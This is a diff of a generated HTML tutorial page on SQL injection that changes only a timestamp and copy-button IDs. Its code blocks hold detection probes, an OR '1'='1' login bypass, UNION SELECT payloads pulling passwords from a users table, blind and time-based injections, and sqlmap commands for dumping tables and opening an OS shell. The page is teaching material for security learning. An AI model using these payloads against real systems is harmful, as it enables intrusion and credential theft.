@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:13 -->
+<!-- 2026-07-30 Thu 22:23 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SQL Injection</title>
@@ -946,11 +946,11 @@ Before exploitation — confirm the injection point exists:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_8490f6534fcc4c7498c891088e0ff821>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_f4d7ed87a94b43b786d60720dda3f25b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8490f6534fcc4c7498c891088e0ff821=document.querySelector('button[name=btn_8490f6534fcc4c7498c891088e0ff821]');
-copyBtnbtn_8490f6534fcc4c7498c891088e0ff821.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Single quote often breaks the query and errors, confirming injection\nGET /product?id=1'\nGET /product?id=1'' -- comment out the rest\n\n# Boolean-based comparison — behavior should differ between these two\nGET /product?id=1 AND 1=1\nGET /product?id=1 AND 1=2\n`);copyBtnbtn_8490f6534fcc4c7498c891088e0ff821.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8490f6534fcc4c7498c891088e0ff821.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f4d7ed87a94b43b786d60720dda3f25b=document.querySelector('button[name=btn_f4d7ed87a94b43b786d60720dda3f25b]');
+copyBtnbtn_f4d7ed87a94b43b786d60720dda3f25b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Single quote often breaks the query and errors, confirming injection\nGET /product?id=1'\nGET /product?id=1'' -- comment out the rest\n\n# Boolean-based comparison — behavior should differ between these two\nGET /product?id=1 AND 1=1\nGET /product?id=1 AND 1=2\n`);copyBtnbtn_f4d7ed87a94b43b786d60720dda3f25b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f4d7ed87a94b43b786d60720dda3f25b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -984,11 +984,11 @@ password. The application might construct a SQL query like this:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_8923116fc92f479fad88aa121ce53c61>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_6bed8a337ded4bcbb3caec0a44771c52>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8923116fc92f479fad88aa121ce53c61=document.querySelector('button[name=btn_8923116fc92f479fad88aa121ce53c61]');
-copyBtnbtn_8923116fc92f479fad88aa121ce53c61.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`SELECT * FROM users WHERE username = '$username' AND password = '$password'\n`);copyBtnbtn_8923116fc92f479fad88aa121ce53c61.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8923116fc92f479fad88aa121ce53c61.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6bed8a337ded4bcbb3caec0a44771c52=document.querySelector('button[name=btn_6bed8a337ded4bcbb3caec0a44771c52]');
+copyBtnbtn_6bed8a337ded4bcbb3caec0a44771c52.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT * FROM users WHERE username = '$username' AND password = '$password'\n`);copyBtnbtn_6bed8a337ded4bcbb3caec0a44771c52.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6bed8a337ded4bcbb3caec0a44771c52.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1002,11 +1002,11 @@ query becomes:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_1d8b857e31c44f5b81de1bd590867b9e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_66edce5b6c4a4aa1b92270984884e658>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e=document.querySelector('button[name=btn_1d8b857e31c44f5b81de1bd590867b9e]');
-copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '$password'\n`);copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1d8b857e31c44f5b81de1bd590867b9e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_66edce5b6c4a4aa1b92270984884e658=document.querySelector('button[name=btn_66edce5b6c4a4aa1b92270984884e658]');
+copyBtnbtn_66edce5b6c4a4aa1b92270984884e658.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '$password'\n`);copyBtnbtn_66edce5b6c4a4aa1b92270984884e658.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_66edce5b6c4a4aa1b92270984884e658.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1036,11 +1036,11 @@ If the original query is:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_43b7a2e7a4c4476db8cbb2da4c7eaa2c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_7084e756662646528d44c7b2fe51125d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c=document.querySelector('button[name=btn_43b7a2e7a4c4476db8cbb2da4c7eaa2c]');
-copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`SELECT product_name, description FROM products WHERE id = $id\n`);copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_43b7a2e7a4c4476db8cbb2da4c7eaa2c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_7084e756662646528d44c7b2fe51125d=document.querySelector('button[name=btn_7084e756662646528d44c7b2fe51125d]');
+copyBtnbtn_7084e756662646528d44c7b2fe51125d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT product_name, description FROM products WHERE id = $id\n`);copyBtnbtn_7084e756662646528d44c7b2fe51125d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_7084e756662646528d44c7b2fe51125d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1053,11 +1053,11 @@ An attacker could inject:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_486972981ea34fca94058c2f180bdb46>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_c2008011f3f6465486f559b00e770856>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_486972981ea34fca94058c2f180bdb46=document.querySelector('button[name=btn_486972981ea34fca94058c2f180bdb46]');
-copyBtnbtn_486972981ea34fca94058c2f180bdb46.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1 UNION SELECT username, password FROM users\n`);copyBtnbtn_486972981ea34fca94058c2f180bdb46.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_486972981ea34fca94058c2f180bdb46.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c2008011f3f6465486f559b00e770856=document.querySelector('button[name=btn_c2008011f3f6465486f559b00e770856]');
+copyBtnbtn_c2008011f3f6465486f559b00e770856.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1 UNION SELECT username, password FROM users\n`);copyBtnbtn_c2008011f3f6465486f559b00e770856.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c2008011f3f6465486f559b00e770856.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1070,11 +1070,11 @@ Resulting in:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_0f8452b1a13f490b8d4791be9afcf3da>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_6fe3ec374bd1441c9306a6264a168c75>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da=document.querySelector('button[name=btn_0f8452b1a13f490b8d4791be9afcf3da]');
-copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`SELECT product_name, description FROM products WHERE id = 1 UNION SELECT username, password FROM users\n`);copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0f8452b1a13f490b8d4791be9afcf3da.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6fe3ec374bd1441c9306a6264a168c75=document.querySelector('button[name=btn_6fe3ec374bd1441c9306a6264a168c75]');
+copyBtnbtn_6fe3ec374bd1441c9306a6264a168c75.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`SELECT product_name, description FROM products WHERE id = 1 UNION SELECT username, password FROM users\n`);copyBtnbtn_6fe3ec374bd1441c9306a6264a168c75.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6fe3ec374bd1441c9306a6264a168c75.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1088,11 +1088,11 @@ same response fields normally used for product name/description.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_ae29ecfe1bcd4f22a2d7857127d0a655>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_5311ab23857e45e58b4c696d6cc2b36d>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655=document.querySelector('button[name=btn_ae29ecfe1bcd4f22a2d7857127d0a655]');
-copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# First: determine the number of columns via ORDER BY\nGET /product?id=1 ORDER BY 1--\nGET /product?id=1 ORDER BY 2--\nGET /product?id=1 ORDER BY 3--  # error here = 2 columns in original query\n\n# Then: identify which columns reflect in the response\nGET /product?id=-1 UNION SELECT 'a','b'--\n\n# Finally: extract real data into the reflecting columns\nGET /product?id=-1 UNION SELECT username,password FROM users--\n`);copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ae29ecfe1bcd4f22a2d7857127d0a655.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5311ab23857e45e58b4c696d6cc2b36d=document.querySelector('button[name=btn_5311ab23857e45e58b4c696d6cc2b36d]');
+copyBtnbtn_5311ab23857e45e58b4c696d6cc2b36d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# First: determine the number of columns via ORDER BY\nGET /product?id=1 ORDER BY 1--\nGET /product?id=1 ORDER BY 2--\nGET /product?id=1 ORDER BY 3--  # error here = 2 columns in original query\n\n# Then: identify which columns reflect in the response\nGET /product?id=-1 UNION SELECT 'a','b'--\n\n# Finally: extract real data into the reflecting columns\nGET /product?id=-1 UNION SELECT username,password FROM users--\n`);copyBtnbtn_5311ab23857e45e58b4c696d6cc2b36d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5311ab23857e45e58b4c696d6cc2b36d.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1119,11 +1119,11 @@ information through verbose error messages.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_4ae186343c914eb19a60cc104cc5b396>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SQL</span><button class='copyBtn' name=btn_df81781436494ca2ac2030284042d499>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_4ae186343c914eb19a60cc104cc5b396=document.querySelector('button[name=btn_4ae186343c914eb19a60cc104cc5b396]');
-copyBtnbtn_4ae186343c914eb19a60cc104cc5b396.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`' AND (SELECT 0 FROM users WHERE 1=0) --\n`);copyBtnbtn_4ae186343c914eb19a60cc104cc5b396.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4ae186343c914eb19a60cc104cc5b396.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_df81781436494ca2ac2030284042d499=document.querySelector('button[name=btn_df81781436494ca2ac2030284042d499]');
+copyBtnbtn_df81781436494ca2ac2030284042d499.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`' AND (SELECT 0 FROM users WHERE 1=0) --\n`);copyBtnbtn_df81781436494ca2ac2030284042d499.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_df81781436494ca2ac2030284042d499.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1151,11 +1151,11 @@ directly, infer data one bit/character at a time.
 <h4 id="org659fbbe">Boolean-Based Blind</h4>
 <div class="outline-text-4" id="text-org659fbbe">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_5ee4ff8060bc4affbbb7ce9afa67b7ef>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_72640acd248542fea5fc40e23bf02650>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef=document.querySelector('button[name=btn_5ee4ff8060bc4affbbb7ce9afa67b7ef]');
-copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# True condition — page behaves normally\nGET /product?id=1 AND 1=1\n\n# False condition — page behaves differently (missing content, different length)\nGET /product?id=1 AND 1=2\n\n# Extracting data character by character via conditional true/false\nGET /product?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'\n`);copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5ee4ff8060bc4affbbb7ce9afa67b7ef.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_72640acd248542fea5fc40e23bf02650=document.querySelector('button[name=btn_72640acd248542fea5fc40e23bf02650]');
+copyBtnbtn_72640acd248542fea5fc40e23bf02650.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# True condition — page behaves normally\nGET /product?id=1 AND 1=1\n\n# False condition — page behaves differently (missing content, different length)\nGET /product?id=1 AND 1=2\n\n# Extracting data character by character via conditional true/false\nGET /product?id=1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'\n`);copyBtnbtn_72640acd248542fea5fc40e23bf02650.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_72640acd248542fea5fc40e23bf02650.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1180,11 +1180,11 @@ content/behavior at all — infer truth via response delay instead.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_323eb1170cb341cdbf77522f6db4f488>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>HTTP</span><button class='copyBtn' name=btn_5e973c7e5f084017b23cc2e67dff021e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_323eb1170cb341cdbf77522f6db4f488=document.querySelector('button[name=btn_323eb1170cb341cdbf77522f6db4f488]');
-copyBtnbtn_323eb1170cb341cdbf77522f6db4f488.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`GET /product?id=1 AND IF(1=1, SLEEP(5), 0)\nGET /product?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  -- PostgreSQL\n`);copyBtnbtn_323eb1170cb341cdbf77522f6db4f488.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_323eb1170cb341cdbf77522f6db4f488.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5e973c7e5f084017b23cc2e67dff021e=document.querySelector('button[name=btn_5e973c7e5f084017b23cc2e67dff021e]');
+copyBtnbtn_5e973c7e5f084017b23cc2e67dff021e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`GET /product?id=1 AND IF(1=1, SLEEP(5), 0)\nGET /product?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--  -- PostgreSQL\n`);copyBtnbtn_5e973c7e5f084017b23cc2e67dff021e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5e973c7e5f084017b23cc2e67dff021e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1206,11 +1206,11 @@ becomes essential rather than optional.
 <h2 id="orga625b8b">Automation with sqlmap</h2>
 <div class="outline-text-2" id="text-orga625b8b">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b5d4a3e202584bca84cccef62813469c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1f88cd171df740ec991f0e959944de12>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b5d4a3e202584bca84cccef62813469c=document.querySelector('button[name=btn_b5d4a3e202584bca84cccef62813469c]');
-copyBtnbtn_b5d4a3e202584bca84cccef62813469c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Basic test against a GET parameter\nsqlmap -u \"http://target.com/product?id=1\" --batch\n\n# Test a POST request captured from Burp\nsqlmap -r request.txt --batch\n\n# Once injection is confirmed, enumerate databases/tables/data\nsqlmap -u \"http://target.com/product?id=1\" --dbs\nsqlmap -u \"http://target.com/product?id=1\" -D targetdb --tables\nsqlmap -u \"http://target.com/product?id=1\" -D targetdb -T users --dump\n\n# Attempt OS command execution if DB privileges allow (MySQL: FILE priv, etc.)\nsqlmap -u \"http://target.com/product?id=1\" --os-shell\n`);copyBtnbtn_b5d4a3e202584bca84cccef62813469c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b5d4a3e202584bca84cccef62813469c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_1f88cd171df740ec991f0e959944de12=document.querySelector('button[name=btn_1f88cd171df740ec991f0e959944de12]');
+copyBtnbtn_1f88cd171df740ec991f0e959944de12.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Basic test against a GET parameter\nsqlmap -u \"http://target.com/product?id=1\" --batch\n\n# Test a POST request captured from Burp\nsqlmap -r request.txt --batch\n\n# Once injection is confirmed, enumerate databases/tables/data\nsqlmap -u \"http://target.com/product?id=1\" --dbs\nsqlmap -u \"http://target.com/product?id=1\" -D targetdb --tables\nsqlmap -u \"http://target.com/product?id=1\" -D targetdb -T users --dump\n\n# Attempt OS command execution if DB privileges allow (MySQL: FILE priv, etc.)\nsqlmap -u \"http://target.com/product?id=1\" --os-shell\n`);copyBtnbtn_1f88cd171df740ec991f0e959944de12.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1f88cd171df740ec991f0e959944de12.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
